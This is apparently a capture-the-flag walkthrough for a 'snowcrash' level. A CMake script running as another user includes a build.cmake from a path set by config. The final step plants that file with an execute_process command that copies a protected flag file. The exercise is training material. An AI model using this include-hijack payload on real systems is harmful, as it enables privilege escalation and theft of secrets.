```bash
level03@snowcrash:~$ cat README
Every Burbclave has rules. Find the loophole.
level03@snowcrash:~$ ls -la /opt/snowcrash/level03/CMakeLists.txt 
-rw-r----- 1 flag03 level03 2327 Jun  9 19:03 /opt/snowcrash/level03/CMakeLists.txt
level03@snowcrash:~$ cat /opt/snowcrash/level03/CMakeLists.txt 
cmake_minimum_required(VERSION 3.20)

# Build configuration matrix
set(BURBCLAVE_SECURITY_LEVEL    "enhanced")
set(BURBCLAVE_RUNTIME_VERSION   "3.0.0-stable")
set(BURBCLAVE_LOG_FACILITY      "syslog")
set(BURBCLAVE_AUDIT_TRAIL       ON)
set(BURBCLAVE_CRYPTO_BACKEND    "aes256-gcm")
set(BURBCLAVE_MAX_SESSIONS      64)
set(BURBCLAVE_SOCKET_PATH       "/var/run/burbclave.sock")
set(BURBCLAVE_STATE_DIR         "/var/lib/burbclave")
set(BURBCLAVE_CONFIG_SCHEMA_VERSION 2)
set(BURBCLAVE_KEEPALIVE_INTERVAL 30)
set(BURBCLAVE_RETRY_LIMIT        5)
set(BURBCLAVE_WATCHDOG_TIMEOUT   120)

# Compiler capability detection
set(HAVE_STACK_PROTECTOR TRUE)
set(HAVE_FORTIFY_SOURCE TRUE)
set(HAVE_PIE TRUE)
set(HAVE_CF_PROTECTION FALSE)

# Install layout

# Build-type gate
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    set(BURBCLAVE_OPTIMIZE_FLAGS "-O2 -DNDEBUG")
    set(BURBCLAVE_STRIP_SYMBOLS ON)
elseif(CMAKE_BUILD_TYPE STREQUAL "Debug")
    set(BURBCLAVE_OPTIMIZE_FLAGS "-O0 -g3")
    set(BURBCLAVE_STRIP_SYMBOLS OFF)
else()
    set(BURBCLAVE_OPTIMIZE_FLAGS "-O1")
    set(BURBCLAVE_STRIP_SYMBOLS OFF)
endif()

# Audit-trail verbosity control
if(BURBCLAVE_AUDIT_TRAIL)
    set(BURBCLAVE_LOG_FLAGS "-DENABLE_AUDIT=1 -DLOG_FACILITY=${BURBCLAVE_LOG_FACILITY}")
else()
    set(BURBCLAVE_LOG_FLAGS "-DENABLE_AUDIT=0")
endif()

# Security level determines link flags
if(BURBCLAVE_SECURITY_LEVEL STREQUAL "enhanced")
    set(BURBCLAVE_LINK_FLAGS "-Wl,-z,relro,-z,now")
elseif(BURBCLAVE_SECURITY_LEVEL STREQUAL "strict")
    set(BURBCLAVE_LINK_FLAGS "-Wl,-z,relro,-z,now,-z,noexecstack")
else()
    set(BURBCLAVE_LINK_FLAGS "")
endif()

# Platform consistency check
if(NOT CMAKE_SYSTEM_NAME STREQUAL "Linux")
    message(WARNING "BurbclaveRuntime is only validated on Linux")
endif()

# Session limit bounds check
if(BURBCLAVE_MAX_SESSIONS LESS 1 OR BURBCLAVE_MAX_SESSIONS GREATER 1024)
    message(FATAL_ERROR "BURBCLAVE_MAX_SESSIONS out of range [1, 1024]")
endif()

file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)

string(REGEX MATCH "runtime_base=([^\n]+)" _ ${CONF_CONTENT})
set(RUNTIME_BASE ${CMAKE_MATCH_1})

string(REGEX MATCH "workspace=([^\n]+)" _ ${CONF_CONTENT})
set(WORKSPACE_NAME ${CMAKE_MATCH_1})

string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")

include(${RESOLVED_BUILD_PATH}/build.cmake)
```

gathering information
```bash
level03@snowcrash:~$ crontab -l
level03@snowcrash:~$ cat /etc/crontab
level03@snowcrash:~$ ls -la /etc/cron.d/
level03@snowcrash:~$ ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
level03@snowcrash:~$ ls -la /var/spool/cron/crontabs/ 2>/dev/null
level03@snowcrash:~$ systemctl list-timers
NEXT                            LEFT LAST                              PASSED UNIT                           ACTIVATES                       
Mon 2026-11-16 18:01:24 UTC      10s Mon 2026-11-16 18:00:54 UTC      19s ago babel.timer                    babel.service
Mon 2026-11-16 18:01:39 UTC      25s Mon 2026-11-16 18:01:09 UTC       4s ago metaverse.timer                metaverse.service
Mon 2026-11-16 18:02:09 UTC      55s Mon 2026-11-16 18:01:09 UTC       4s ago burbclave.timer                burbclave.service
Mon 2026-11-16 18:02:09 UTC      55s Mon 2026-11-16 18:01:09 UTC       4s ago juanita.timer                  juanita.service
Mon 2026-11-16 18:10:00 UTC     8min Mon 2026-11-16 18:00:08 UTC  1min 5s ago sysstat-collect.timer          sysstat-collect.service
Mon 2026-11-16 18:34:40 UTC    33min Mon 2026-11-16 17:24:43 UTC    36min ago fwupd-refresh.timer            fwupd-refresh.service
Tue 2026-11-17 00:00:00 UTC 5h 58min Mon 2026-11-16 16:02:26 UTC 1h 59min ago dpkg-db-backup.timer           dpkg-db-backup.service
Tue 2026-11-17 00:00:00 UTC 5h 58min Mon 2026-11-16 16:02:26 UTC 1h 59min ago logrotate.timer                logrotate.service
Tue 2026-11-17 00:07:00 UTC       6h -                                      - sysstat-summary.timer          sysstat-summary.service
Tue 2026-11-17 01:13:32 UTC       7h Tue 2026-06-09 19:02:25 UTC            - apt-daily.timer                apt-daily.service
Tue 2026-11-17 01:24:28 UTC       7h Fri 2026-10-30 19:49:02 UTC            - man-db.timer                   man-db.service
Tue 2026-11-17 06:47:27 UTC      12h Mon 2026-11-16 16:55:37 UTC  1h 5min ago apt-daily-upgrade.timer        apt-daily-upgrade.service
Tue 2026-11-17 16:07:03 UTC      22h Mon 2026-11-16 16:07:03 UTC 1h 54min ago update-notifier-download.timer update-notifier-download.service
Tue 2026-11-17 16:16:52 UTC      22h Mon 2026-11-16 16:16:52 UTC 1h 44min ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
Sat 2026-11-21 20:02:28 UTC   5 days Tue 2026-06-09 19:02:25 UTC            - update-notifier-motd.timer     update-notifier-motd.service
Sun 2026-11-22 03:10:20 UTC   5 days Mon 2026-11-16 16:02:26 UTC 1h 58min ago e2scrub_all.timer              e2scrub_all.service
Mon 2026-11-23 00:23:25 UTC   6 days Mon 2026-11-16 16:30:24 UTC 1h 30min ago fstrim.timer                   fstrim.service

17 timers listed.
Pass --all to see loaded but inactive timers, too.
```

Found it:
```bash
level03@snowcrash:~$ systemctl cat burbclave.service 
# /etc/systemd/system/burbclave.service
[Unit]
Description=Burbclave build runner (one-shot)
After=network.target

[Service]
Type=oneshot
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
StandardOutput=null
StandardError=null
```

exploit:
```bash
level03@snowcrash:~$ cat > /var/lib/burbclave/staging/build.cmake << 'EOF'
execute_process(
  COMMAND bash -c "cat /home/flag03/.flag > /tmp/flag03 2>&1"
  OUTPUT_QUIET ERROR_QUIET
)
EOF
sleep 60
cat /tmp/flag03
```
